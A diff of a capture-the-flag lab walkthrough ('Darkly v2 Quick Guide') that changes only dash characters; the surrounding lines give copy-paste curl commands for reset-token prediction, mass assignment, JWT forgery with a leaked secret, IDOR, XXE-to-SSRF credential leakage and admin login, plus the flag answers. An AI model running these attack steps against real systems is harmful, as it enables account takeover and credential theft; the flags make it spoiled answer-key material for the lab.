@@ -1,4 +1,4 @@
-# Darkly v2 — Quick Guide
+# Darkly v2 - Quick Guide
 
 Fast path to all **6 mandatory flags**. Copy-paste, top to bottom. Assumes the VM is
 running and the app answers at `http://localhost:4942` (see `SETUP.md`).
@@ -10,7 +10,7 @@ PB=http://localhost:8090   # internal PocketBase (forward it too: hostfwd ...809
 
 ---
 
-## Flag 1 — predictable & disclosed reset token
+## Flag 1 - predictable & disclosed reset token
 Reset token = `md5(email)`, and the app hands it back in the redirect. Reset a student
 and log in.
 ```bash
@@ -23,7 +23,7 @@ J=$(grep session ben.jar | awk '{print $NF}')    # student session JWT
 The flag is `recovery_code` on the account → `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
 (read it in Flag 4).
 
-## Flag 2 — mass assignment (student → cadet)
+## Flag 2 - mass assignment (student → cadet)
 ```bash
 curl -s -b "session=$J" -X PATCH "$B/api/profile" -H 'Content-Type: application/json' -d '{"role":"cadet"}' >/dev/null
 curl -s -c ben.jar "$B/login" --data "identity=$E&password=Pwn3d!123" >/dev/null   # refresh JWT -> cadet
@@ -32,7 +32,7 @@ curl -s -b "session=$J" "$B/staff/dashboard" | grep -oE 'FLAG\{[^}]*\}'
 # FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
 ```
 
-## Flag 3 — weak JWT secret (forge the god account)
+## Flag 3 - weak JWT secret (forge the god account)
 Secret `42network` is leaked in the forum. `/admin` trusts the user behind `sub`; forge
 sophie's token (id `enplwhu8jfo56oi`).
 ```bash
@@ -47,14 +47,14 @@ curl -s -b "session=$(cat sophie.jwt)" "$B/admin" | grep -oE 'FLAG\{[^}]*\}' | h
 # FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
 ```
 
-## Flag 4 — IDOR (read any user record)
+## Flag 4 - IDOR (read any user record)
 ```bash
 curl -s -b "session=$J" "$B/api/users/k1asdfeditojrb4" | python3 -m json.tool | grep -E 'private_note|recovery_code'
 # wil.private_note  = FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
 # any.recovery_code = FLAG{r3s3t_t0k3n_w4s_just_md5_lol}  (this is Flag 1)
 ```
 
-## Flag 5 — XXE → SSRF (read localhost-only config)
+## Flag 5 - XXE → SSRF (read localhost-only config)
 ```bash
 cat > xxe.xml <<'XML'
 <?xml version="1.0"?>
@@ -67,7 +67,7 @@ curl -s -b "session=$J" -F 'file=@xxe.xml;type=text/xml' "$B/agenda/import" \
 #  "pb_admin_password":"Darkly42Admin!",...,"darkly_flag":"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"}
 ```
 
-## Flag 6 — PocketBase superuser (creds from Flag 5)
+## Flag 6 - PocketBase superuser (creds from Flag 5)
 Needs `:8090` reachable (forward it).
 ```bash
 T=$(curl -s "$PB/api/admins/auth-with-password" -H 'Content-Type: application/json' \
